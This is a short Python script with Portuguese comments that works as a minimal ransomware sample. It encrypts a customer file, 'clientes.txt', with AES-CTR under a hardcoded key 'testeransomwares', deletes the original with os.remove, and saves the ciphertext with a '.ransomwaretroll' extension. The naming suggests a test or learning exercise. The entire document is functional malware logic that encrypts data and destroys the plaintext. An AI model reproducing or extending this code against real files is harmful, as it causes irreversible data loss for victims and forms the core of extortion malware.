from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

# Nome do arquivo original
file_name = 'clientes.txt'

# Ler o arquivo original
with open(file_name, 'rb') as file:
    file_data = file.read()

# Gerar uma chave de 16 bytes para AES-128
key = b"testeransomwares"  # 16 bytes fixos para AES-128

# Inicializar o AES no modo CTR
cipher = AES.new(key, AES.MODE_CTR)

# Obter o nonce gerado automaticamente
nonce = cipher.nonce

# Criptografar os dados
ciphertext = cipher.encrypt(file_data)

# Salvar o nonce no início do arquivo criptografado
crypto_data = nonce + ciphertext

# Excluir o arquivo original
os.remove(file_name)

# Criar o arquivo criptografado
new_file_name = file_name + '.ransomwaretroll'
with open(new_file_name, 'wb') as new_file:
    new_file.write(crypto_data)

# Exibir o tamanho do nonce
print(f"Tamanho do nonce: {len(nonce)} bytes")
print(f"Arquivo '{file_name}' foi criptografado como '{new_file_name}'.")

